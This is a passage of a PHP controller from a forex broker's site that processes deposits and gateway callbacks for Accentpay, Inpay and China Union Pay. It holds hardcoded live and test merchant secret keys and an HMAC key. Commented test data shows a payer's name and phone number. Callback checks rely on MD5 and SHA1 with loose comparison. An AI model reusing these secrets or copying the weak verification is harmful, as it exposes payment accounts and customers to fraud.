                    'user_id' => $this->session->userdata('user_id'),
                    'currency' => 'USD',
                    'payment_type' => $this->input->post('payment_type'),
                ];

                $this->general_model->insert('accentpay', $insert_data);

                $result = $ecommpay->paymentPage();
            }

            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
            // $data['user_status'] = $user_status;
            $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $status = $this->input->get('status', true);
            $data['status'] = $status;
            if ($status === 'success') {
                $data['success'] = true;
            } else {
                $data['success'] = false;
            }
            //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            $account = $this->general_model->whereConditionQuery($user_id);

            $data['account'] = $account;
            $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['currency']);
            $data['metadata_description'] = 'Accentpay.';
            $this->template->title('ForexMart | Deposit - Payoma')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/accentpay', $data);
        } else {
            redirect('signout');
        }
    }

    public function accentpay_callback()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $this->general_model->insert('accentpay_log', ['log' => serialize($data)]);

        $this->accentPayDepositProcess($data);
    }

    public function inpay_unit_test()
    {
        // if(!IPLoc::Office()){redirect('');}
        //  $data = '{"merchant_id":"1184","received_sum":"283.75","invoice_reference":"358WUNM","invoice_currency":"USD","invoice_status":"approved","api_version":"2.0.0","invoice_updated_at":"2019-06-13 07:46:28","invoice_amount":"300.00","checksum":"be39e355f6712fab0ed7a1a40dfae9d2","bank_owner_name":"Edward Yunan","order_id":"FM-INPY1559124584"}';
        // $data =	'{"invoice_status":"approved","merchant_id":"1052","api_version":"2.0.0","received_sum":"2.00","invoice_updated_at":"2019-02-13 06:08:03","invoice_amount":"2.00","invoice_reference":"4E9UQLV","checksum":"25088ec0ccfc5991a74c8df308188267","order_id":"FM-INPY1550038069","invoice_currency":"USD","bank_owner_name":""}';
        $inpayData = json_decode($data, true);
        $this->inpayDepositProcess($inpayData);
    }

    public function testinpay()
    {
        echo '<pre>';
        $countries = $this->inpaySendRequest('get_countries');
        $selectOption = '';
        $user_country = 'TW';
        foreach ($countries['countries'] as $country_data) {
            $selected = $user_country == $country_data['iso'] ? 'selected' : '';
            $selectOption = $selectOption.'<option '.$selected." value='".$country_data['iso']."'>".$country_data['name'].'</option>';
        }

        var_dump($countries);

        $getbanks = $this->inpaySendRequest('get_banks');
//        $data['bank_option'] = '';
//        foreach($getbanks['banks'] as $banks_key => $banks_data){
//            $data['bank_option'] .= "<option ".$selected." value='".$banks_data['id']."'>". $banks_data['name']."</option>";
//        }

        var_dump($getbanks);
    }

    public function inpay_postbacknotification()
    {
        $responsedata = ['log' => json_encode($_POST)];
        $this->general_model->insert('inpay_log', $responsedata);
        $this->inpayDepositProcess($_POST);
    }

    public function inpayDepositProcess(array $inpayData)
    {
        $checksum = $inpayData['checksum'];
        $invoice_currency = $inpayData['invoice_currency'];
        $invoice_amount = $inpayData['invoice_amount'];
        $order_id = $inpayData['order_id'];
        $received_sum = $inpayData['received_sum'];
        $invoice_reference = $inpayData['invoice_reference'];
        $invoice_status = $inpayData['invoice_status'];
        $invoice_updated_at = $inpayData['invoice_updated_at'];
        $bank_owner_name = $inpayData['bank_owner_name'];
        $merchant_id = $inpayData['merchant_id'];

        if ($merchant_id == '1052') {
            $secret_key = '7i1v4cI3';
        }
        if ($merchant_id == '1184') {
            $secret_key = 'Th5505Vm';
        }

        ksort($inpayData);
        $res = '';

        $i = 1;
        foreach ($inpayData as $key => $value) {
            $value = urlencode(stripslashes($value));
            if ($key != 'checksum') {
                if ($i == 1) {
                    $res .= "$key=$value";
                } else {
                    $res .= "&$key=$value";
                }
            }

            $i = $i + 1;
        }

        $calculated_checksum = md5($res.'&secret_key='.$secret_key);
        // $calculated_checksum = md5("api_version=2.0.0&bank_owner_name=".$bank_owner_name."&invoice_amount=".$invoice_amount."&invoice_currency=".$invoice_currency."&invoice_reference=".$invoice_reference."&invoice_status=".$invoice_status."&invoice_updated_at=". urlencode(stripslashes($invoice_updated_at))."&merchant_id=".$merchant_id."&order_id=".$order_id."&received_sum=".$received_sum."&secret_key=".$secret_key);
        if ($calculated_checksum == $checksum) {
            if ($invoice_status == 'approved') {
                $condition_inpay = [  // save only one unique transaction id in the inpay table (task FXPP-11129)
                    'payment_ref' => $invoice_reference,
                    'status' => 1,
                ];

                if ($this->general_model->whereCondition('inpay', $condition_inpay)) {
                    return false;
                }

                if ($row = $this->general_model->where('inpay', ['payment_ref' => $invoice_reference, 'status' => 0])) {
                    $invData = $row->row_array();
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $conv_amount_usd = $this->get_convert_amount($invoice_currency, $received_sum, $accData['currency']);

                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$invoice_currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $received_sum *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    $data = [
                        'transaction_id' => $invoice_reference,
                        'reference_id' => $order_id,
                        'status' => 2,
                        'amount' => $received_sum,
                        'currency' => $invoice_currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'Inpay Deposit',
                        'transaction_type' => 'INPAY',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via Innpay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $received_sum, $this->comment_type['deposit'].$this->comment_transaction_type['INPAY'].$invoice_reference);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $received_sum, $this->comment_type['deposit'].$this->comment_transaction_type['INPAY'].$invoice_reference);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                        //FXPP::BackAgentOfAccount($account_number);
                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        }
                    }

                    $this->SetAccountAgentPotentialFund($account_number);

                    $deposit_id = $this->deposit_model->insertPayment($data);

                    $updateData = ['status' => 1];
                    $this->general_model->updatemy('inpay', 'payment_ref', $invoice_reference, $updateData);

                    /* ========================================== Welcome bonus================================================ **/

//                    if ($invData['bonus'] == "tenpb") {
//
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 10%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', 'tenpb', $data['transaction_id']);
//                    }

//                    if ($invData['bonus'] == 'twpb') {
//                        // $this->deposit_20PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 20%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', 'twpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'tpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 30%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', 'tpb', $data['transaction_id']);
//                    }
//                    if ($invData['bonus'] == 'fpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART WELCOME BONUS 50%
//                        FXPP::DepositBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', 'fpb', $data['transaction_id']);
//                    }
//
//                    if ($invData['bonus'] == 'hpb') {
//                        // $this->deposit_30PercentBonus($account_number,$bonus);  // FOREXMART limited 100%  BONUS
//                        FXPP::Deposit100PercentBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', 'hplb', $data['transaction_id']);
//                    }
//
//                    if (IPLoc::Office()) {
//                        if ($invData['bonus'] == 'rhpb') {
//                            FXPP::DepositRegular100PercentBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', 'rhpb', $data['transaction_id']);
//                        }
//                    }

                    self::applyDepositBonus($invData['user_id'], $account_number, $received_sum, 'INPAY', $invData['bonus'], $data['transaction_id'], false);

                    $bonuses = FXPP::getAccountBonusByType($account_number);

                    $RequestLogintype = $this->account_model->getAccountLoginType($invData['user_id']);
                    if ($RequestLogintype['login_type'] != 1) {
                        if ($received_sum > 0 and $bonuses[2] > 0) {
                            FXPP::BonusProfitCancellation($invData['user_id'], $account_number, $received_sum, $data['transaction_id']);
                        }
                    }

                    // Bonus Profit Logs**/
                    $ndbProfitLogs = [
                        'Account_number' => $account_number,
                        'DepAmount' => $received_sum,
                        'UserId' => $invData['user_id'],
                        'TransactionId' => $data['transaction_id'],
                        'ndbbonus' => $bonuses[2],
                    ];
                    $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                    $insertProfitLogs = [
                        'logs' => $encodeNdbProfitLogs,
                        'User_Id' => $invData['user_id'],
                    ];

                    $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                    /**=========================================== Welcome bonus end ====================================================**/

                    /**  Use original amount for Cent accounts**/
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    $processed_amount = floatval($conv_amount_usd);
                    if ($isMicro) {
                        $processed_amount /= 100;
                    }
                    /* End **/

                    /* Send successful email deposit to auto-reports **/
                    $this->sendEmailAfterSuccessDeposit('INPAY', $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type['INPAY'].$data['transaction_id']);
                    /* End **/
                }
            } elseif ($invoice_status == 'cancelled') {
                $updateData = ['status' => 2, 'comment' => 'cancelled payment.'];
                $this->general_model->updatemy('inpay', 'payment_ref', $invoice_reference, $updateData);
            }
        } else {
            $updateData = ['status' => 2, 'comment' => 'checksum does not match.'];
            $this->general_model->updatemy('inpay', 'payment_ref', $invoice_reference, $updateData);
        }
    }

    public function inpay_cancel()
    {
        $payment_ref = $this->input->get('ref', true);
        $cancel_info = [
            'invoice_ref' => $payment_ref,
            'fail_on_no_fund' => 1,
        ];
        $updateData = ['status' => 2, 'comment' => 'invoice cancelled.'];
        $this->general_model->updatemy('inpay', 'payment_ref', $payment_ref, $updateData);
        $this->inpaySendRequest('cancel_invoice', $cancel_info);
        $message = 'Transaction has been cancelled!';
        $this->session->set_flashdata('msg', $message);
        redirect(FXPP::loc_url('deposit/inpay'));
    }

    public function inpay_return()
    {
        redirect(FXPP::loc_url('deposit/inpay'));
    }

    public function inpay()
    {
        redirect('deposit');

        if ($this->session->userdata('logged')) {
            $user_id = $this->session->userdata('user_id');
            $data['bounusfiled'] = $this->input->get('bonus', true);
            $account = $this->general_model->whereConditionQuery($user_id);
            $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');
            $user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created');
            $order_id = $this->session->userdata('user_id').time();

            $data['amount'] = $this->input->post_get('amount1', true);
            //   if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Amount', 'trim|required|xss_clean');
            //   }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                $data['amount'] = $this->input->post('amount', true);
                $countries = $this->inpaySendRequest('get_countries');
                $data['country_option'] = '';
                $user_country = $profile['country'];
                foreach ($countries['countries'] as $country_data) {
                    $selected = $user_country == $country_data['iso'] ? 'selected' : '';
                    $data['country_option'] .= '<option '.$selected." value='".$country_data['iso']."'>".$country_data['name'].'</option>';
                }

                $bank_data = [
                    'country_id' => $profile['country'],
                    //'only_instant' =>1,'
                ];
                $getbanks = $this->inpaySendRequest('get_banks');
                $data['bank_option'] = '';
                foreach ($getbanks['banks'] as $banks_key => $banks_data) {
                    $data['bank_option'] .= '<option '.$selected." value='".$banks_data['id']."'>".$banks_data['name'].'</option>';
                }

                $data['mt_currency'] = $account['currency'];
                $date = new DateTime();
                $order_number = $date->getTimestamp();
                $data['order_id'] = 'FM-INPY'.$order_number;
                $data['desc'] = 'Deposit Inpay ['.$account['account_number'].']';

                $insertData = [
                    'account_number' => $account['account_number'],
                    'amount' => $data['amount'],
                    'order_id' => $data['order_id'],
                    'bonus' => $this->input->get('bonus'),
                    'user_id' => $this->session->userdata('user_id'),
                    'order_text' => $data['desc'],
                    'currency' => $data['mt_currency'],
                    'status' => 0,
                ];
                $this->general_model->insert('inpay', $insertData);

                $css = $this->template->Css();
                $js = $this->template->Css();
                $this->template->title(lang('dep_tit'))
                    ->append_metadata_css("<link rel='stylesheet' href='".$css."/deposit-inpay.css'> ")
                    ->set_layout('internal/main')
                    ->prepend_metadata("<script src='".$js."custom-deposit.js'></script>")
                    ->build('deposits/inpay_payment', $data);
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                //   $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $data['account'] = $account;
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['currency']);
                $data['metadata_description'] = 'Inpay.';
                $this->template->title('ForexMart | Deposit - Inpay')
                        ->set_layout('internal/main')
                        ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                        ->build('deposits/inpay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function ajaxGetRequest()
    {
        $user_id = $this->session->userdata('user_id');
        $account_number = $this->session->userdata('account_number');
        $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,street,zip,city,country');
        // $order_id = time().uniqid(mt_rand());
        $order_id = $this->input->post('order_id');
        $total_amount = sprintf('%1.2f', (float) $this->input->post('amount'));
        $mt_currency = $this->input->post('mt_currency');
        $bank_id = $this->input->post('bank_name');
        $country = $this->input->post('payer_country');

        $test_accounts = [
            '325730',
        ];
        $getbanks = $this->inpaySendRequest('get_banks');
        $data['bank_option'] = '';
        $banks = [];
        foreach ($getbanks['banks'] as $banks_key => $banks_data) {
            if ($banks_data['id'] == $bank_id) {
                $banks = [
                    'bank_url' => $banks_data['url'],
                    'bank_address' => $banks_data['bank_address'],
                    'bank_name' => $banks_data['name'],
                    'bank_id' => $banks_data['id'],
                    'owner_address' => $banks_data['owner_address'],
                ];
                foreach ($banks_data['inpay_bank_account'] as $acc_key => $acc_val) {
                    $banks[$acc_key] = $acc_val;
                }
            }
        }

        //create invoice
        $invoice_data = [
            'amount' => $total_amount,
            'bank_id' => $this->input->post('bank_name'),
            'buyer_email' => $this->session->userdata('email'),
            'buyer_address' => $profile['street'].', '.$profile['zip'].' '.$profile['city'].' '.$profile['country'],
            'buyer_name' => $profile['full_name'],
            'currency' => $mt_currency,
            'order_id' => $order_id,
            'order_text' => 'Deposit Inpay ['.$account_number.']',
        ];
        $exp_owner_add = (explode('<br />', $banks['owner_address']));
        $invoice_return_data = [];
        $getInvoice = $this->inpaySendRequest('create_invoice', $invoice_data);

        $set_details_info = [
            'invoice_ref' => $getInvoice['invoice']['reference'],
            'send_email_type' => 'instruction', //receipt
            'buyer_email' => $this->session->userdata('email'),
            'buyer_name' => $profile['full_name'],
            'send_email' => 1,
        ];

        $this->inpaySendRequest('set_user_details', $set_details_info);

        //approved transfer funds for test accounts only
//        if (in_array($user_id, $test_accounts)) {
//            $this->inpayTestTransfer($getInvoice['invoice']['reference']);
//        }

        $inpay_add_info = [
            'buyer_name' => $invoice_data['buyer_name'],
            'bank_name' => $banks['bank_name'],
            'bank_id' => $banks['bank_id'],
            'branch_code' => $banks['branch_code'],
            'owner_name' => $exp_owner_add[0],
            'owner_address' => $banks['owner_address'],
            'bank_address' => $banks['bank_address'],
            'bank_currency' => $banks['currency'],
            'swift' => $banks['swift'],
            'iban' => $banks['iban'],
            'bank_account_number' => $banks['account'],
            'payment_ref' => $getInvoice['invoice']['reference'],
            'conv_amount' => $getInvoice['invoice']['transfer_amount'],
            'country' => $country,
        ];

        $this->general_model->update('inpay', 'order_id', $order_id, $inpay_add_info);

        $this->output->set_content_type('application/json')
             ->set_output(
                  json_encode(
                      [
                          'data' => $banks,
                          'invoice' => $getInvoice,
                      ]
                  )
              );
    }

    public function inpaySendRequest($method, $payee_data = null)
    {
        $request_type = $method.'?';
        $payee_data['frmt'] = 'json';
        if (IPloc::Office()) {
            $payee_data['merchant_id'] = '1052';
            $secret_key = '7i1v4cI3';
            $url = 'https://test-admin.inpay.com/api/v2/'.$request_type;
        } else {
            $payee_data['merchant_id'] = '1184';
            $secret_key = 'Th5505Vm';
            $url = 'https://admin.inpay.com/api/v2/'.$request_type;
        }

        ksort($payee_data);
        $req = '';
        $i = 1;
        foreach ($payee_data as $key => $value) {
            $value = urlencode(stripslashes($value));

            if ($i == 1) {
                $req .= "$key=$value";
            } else {
                $req .= "&$key=$value";
            }
            $i = $i + 1;
        }

        $check = strtoupper(hash_hmac('sha256', $req, $secret_key));
        $dataEncode = $req.'&checksum='.$check;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $dataEncode);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        $data_decode = json_decode($result, true);
        curl_close($ch);
        $responsedata = [
           'end_point' => $method,
           'log' => $result,
           'user_id' => $this->session->userdata('user_id'),
       ];
        $this->general_model->insert('inpay_request_log', $responsedata);

        return $data_decode;
    }

    public function comfirmInpaypayment()
    {
        $payment_ref = $this->input->post('payment_ref', true);
        $confirm_info = [
          'invoice_ref' => $payment_ref,
      ];
        $status = $this->inpaySendRequest('get_invoice_status', $confirm_info);
        $this->output->set_content_type('application/json')
          ->set_output(
              json_encode(
                  [
                      'data' => $status,
                      'payment_ref' => $payment_ref,
                  ]
              )
          );
    }

    public function inpayTestTransfer()
    {
        $ref = $this->input->post('payment_ref', true);
        $passkey = md5('1052:7i1v4cI3');
        $url = 'https://test-admin.inpay.com/test/create_transfer?invoice_ref='.$ref.'&passkey='.$passkey;
        $contents = file_get_contents($url);
        $result = false;
        if ($contents !== false) {
            $result = true;
        }

        $this->output->set_content_type('application/json')
            ->set_output(
                json_encode(
                    [
                        'result' => $result,
                    ]
                )
            );
    }

    public function china_union_pay()
    {
        redirect(FXPP::loc_url('deposit'));

        if ($this->session->userdata('logged')) {
            // FXPP::LoginTypeRestriction();

            $user_id = $this->session->userdata('user_id');
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->get('bonus', true);

            $field_value = '';
            if ($_POST) {
                $field_value = [
                    'amount' => $this->input->post('amount'),
                    'first_name' => $this->input->post('first_name'),
                    'last_name' => $this->input->post('last_name'),
                     'address1' => $this->input->post('address1'),
                    'city' => $this->input->post('city'),
                    'zip_code' => $this->input->post('zip_code'),
                    'phone' => $this->input->post('phone'),
                ];
            }

            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Deposit amount', 'trim|required|deposit_cup_amt_validation');
            // }

            $this->form_validation->set_rules('first_name', 'First name', 'trim|required|min_length[4]|max_length[30]');
            $this->form_validation->set_rules('last_name', 'Last name', 'trim|required|min_length[4]|max_length[30]');
            $this->form_validation->set_rules('address1', 'Address', 'trim|required|min_length[10]|max_length[50]');
            $this->form_validation->set_rules('city', 'City', 'trim|required|min_length[4]|max_length[30]');
            $this->form_validation->set_rules('zip_code', 'Zip code', 'trim|required|min_length[3]|max_length[10]');
            $this->form_validation->set_rules('phone', 'Phone', 'trim|required|min_length[4]|max_length[13]');

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                if ($user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created')) {
                    $profile = $this->general_model->showssingle($table = 'user_profiles', 'user_id', $user_id, 'full_name,city,country');

                    $amount = ($this->input->post('amount', true) * 100);

                    $cup_parameteres = [
                    'apiversion' => 3,
                    'version' => 11,
                    'merchant_account' => 900893,
                    'merchant_order' => uniqid(),
                    'merchant_product_desc' => 'CUP Deposit',
                    'first_name' => $this->input->post('first_name', true),
                    'last_name' => $this->input->post('last_name', true),
                    'address1' => $this->input->post('address1', true),
                    'city' => $this->input->post('city', true),
                    'zip_code' => $this->input->post('zip_code', true),
                    'country' => 'CN',
                    'phone' => $this->input->post('phone', true),
                    'email' => $user['email'],
                    'amount' => $amount,
                    'currency' => 'CNY',
                    'bankcode' => 'LBT',
                    'ipaddress' => $this->input->ip_address(),
                    'return_url' => 'https://my.forexmart.com/deposit/china_union_pay',
                    'server_return_url' => 'https://my.forexmart.com/deposit/cup_status',
                ];

                    $insert_data = [
                     'merchant_order' => $cup_parameteres['merchant_order'],
                     'first_name' => $this->input->post('first_name', true),
                     'last_name' => $this->input->post('last_name', true),
                     'address1' => $this->input->post('address1', true),
                     'city' => $this->input->post('city', true),
                     'zip_code' => $this->input->post('zip_code', true),
                     'country' => 'CN',
                     'phone' => $this->input->post('phone', true),
                     'email' => $user['email'],
                     'amount' => $amount,
                     'user_id' => $user_id,
                     'create_date' => date('Y-m-d H:i:s'),
                 ];

                    $this->general_model->insertmy('cup_info', $insert_data);

                    $control = $cup_parameteres['merchant_account'].$cup_parameteres['amount'].$cup_parameteres['currency'].$cup_parameteres['first_name'].$cup_parameteres['last_name'].$cup_parameteres['address1'].$cup_parameteres['city'].$cup_parameteres['zip_code'].$cup_parameteres['country'].$cup_parameteres['phone'].$cup_parameteres['email'].$cup_parameteres['merchant_order'].$cup_parameteres['merchant_product_desc'].$cup_parameteres['return_url'];

                    $control = hash_hmac('sha1', $control, '9eda32be0dac79e9331f7bace30d084f');
                    $cup_parameteres['control'] = $control;

                    $data['cup_pra'] = $cup_parameteres;
                    $data['url'] = 'https://payment.cdc.alogateway.co/ChinaDebitCard';

                    $this->load->view('deposits/cup_payment', $data);
                }
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                // $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status === 'success') {
                    $data['success'] = true;
                } else {
                    $data['success'] = false;
                }

                $data['field_value'] = $field_value;

                //$account = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['currency']);
                $data['metadata_description'] = 'China union pay';
                $this->template->title('ForexMart | Deposit - Chaina union pay')
                ->set_layout('internal/main')
                ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build('deposits/china_union_pay', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function cup_status()
    {
        $insertData = ['log' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('cup_log', $insertData);
        $this->cupDepositProcess($_POST);
    }

    public function cup_unit_test()
    {
        if (!IPLoc::Office()) {
            redirect('');
        }
        /* $data = 'a:15:{s:13:"transactionid";s:8:"44725533";s:14:"merchant_order";s:13:"5c7799a5f06e3";s:18:"bank_transactionid";s:8:"44725533";s:8:"currency";s:3:"CNY";s:6:"amount";s:5:"10000";s:6:"status";s:2:"A0";s:7:"message";s:39:"Paid / Refunded / Successful requested.";s:14:"transaction_id";s:8:"44725533";s:19:"bank_transaction_id";s:8:"44725533";s:17:"billingdescriptor";s:14:"ChinaDebitCard";s:10:"first_name";s:4:"rong";s:9:"last_name";s:2:"ji";s:8:"bankcode";s:3:"LBT";s:7:"control";s:40:"d2f6ca13c33f6d13f1d3521ea37852ccb6b3dbcf";s:5:"phone";s:11:"13965483011";}';
         $cupData = unserialize($data);
         $this->cupDepositProcess($cupData);*/
    }

    private function cupDepositProcess(array $cupData)
    {
        $control = $cupData['transactionid'].$cupData['merchant_order'].$cupData['amount'].$cupData['currency'].$cupData['bank_transactionid'].$cupData['status'];
        $control = hash_hmac('sha1', $control, '9eda32be0dac79e9331f7bace30d084f');

        if ($cupData['status'] == 'A0' && $control == $cupData['control']) {
            $paidAmount = ($cupData['amount'] / 100);

            if ($row = $this->general_model->where('cup_info', ['merchant_order' => $cupData['merchant_order'], 'status' => 0])) {
                $invData = $row->row_array();

                if (floatval($invData['amount']) == floatval($cupData['amount'])) {
                    $accData = $this->general_model->whereConditionQuery($invData['user_id']);
                    $amount = $paidAmount;
                    $total_amount = $this->get_convert_amount('CNY', $amount, $accData['currency']);
                    $amount = $this->get_convert_amount('CNY', $amount, $accData['currency']);

                    $currency = $accData['currency'];
                    /* FXPP-6333 */
                    $currencyStatus = $this->currency_status[$currency];
                    $isMicro = $this->account_model->isMicro($invData['user_id']);
                    if ($isMicro) {
                        $amount *= 100;
                        $total_amount *= 100;
                        $currencyStatus = $this->currency_status['Cents'];
                    }
                    /* FXPP-6333 */

                    // $fee = (($amount * 3.5)/100)+0.50; // Fee (3.5%)+ fixed feed(0.50$)
                    $fee = (($amount * 2.5) / 100);

                    $bonus = $amount * 0.30;
                    $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $fee);
                    $conv_amount_bonus_usd = $this->get_convert_amount($accData['currency'], $bonus);
                    $amount -= $fee;

                    $conv_amount = $amount;
                    $conv_amount_fee = $fee;
                    $conv_amount_bonus = $bonus;
                    $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);

                    $insertDepositFailed = [
                        'transaction_id	' => $invData['merchant_order'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => 'CHINAUNIONPAY',
                        'payment_status' => $this->paymentType_status['Deposit via China Union Pay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                        'fee' => $fee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                    $data = [
                        'transaction_id' => $invData['merchant_order'],
                        'reference_id' => $cupData['transactionid'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $currency,
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'note' => 'CUP deposit',
                        'transaction_type' => 'CHINAUNIONPAY',
                        'conv_amount' => $conv_amount_usd,
                        'payment_status' => $this->paymentType_status['Deposit via China Union Pay'], //FXPP-7618
                        'currency_status' => $currencyStatus, //FXPP-7618
                    ];

                    if ($fee > 0) {
                        $data_fee = [
                            'transaction_id' => $invData['merchant_order'],
                            'reference_id' => $cupData['transactionid'],
                            'status' => 2,
                            'amount' => $fee,
                            'currency' => $currency,
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                            'note' => 'CUP deposit',
                            'transaction_type' => 'CHINAUNIONPAY',
                            'conv_amount' => $conv_amount_fee_usd,
                            'payment_status' => $this->paymentType_status['Deposit via China Union Pay'], //FXPP-7618
                            'currency_status' => $currencyStatus, //FXPP-7618
                        ];
                    }

                    $config = [
                        'server' => 'live_new',
                    ];
//                    $WebService = new WebService($config);

                    $account_number = $accData['account_number'];

//                    if (IPLoc::APIUpgradeDevIP()) {
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['CHINAUNIONPAY'].$invData['merchant_order']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
//                    } else {
//                        $WebService->update_live_deposit_balance($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type['CHINAUNIONPAY'].$invData['merchant_order']);
//                        $requestResult = $WebService->request_status;
//                        $ticket = $WebService->get_result('Ticket');
//                    }

                    if ($requestResult === 'RET_OK') {
                        $data['mt_ticket'] = $ticket;

                        // Back Agent of Client
                       // FXPP::BackAgentOfAccount($account_number);

                        $WebService2 = new WebService($config);
                        $WebService2->request_live_account_balance($account_number);
                        if ($WebService2->request_status === 'RET_OK') {
                            $balance = $WebService2->get_result('Balance');
                            $this->account_model->updateAccountBalance($account_number, $balance);
                        ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
                        } else {
                            $insertDepositFailed['comment'] = $WebService2->request_status;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }
                    } else {
                        $insertDepositFailed['comment'] = $requestResult;
                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                    }

                    if ($fee > 0) {
//                        $WebService = new WebService($config);
                        $account_number = $accData['account_number'];

//                        if (IPLoc::APIUpgradeDevIP()) {
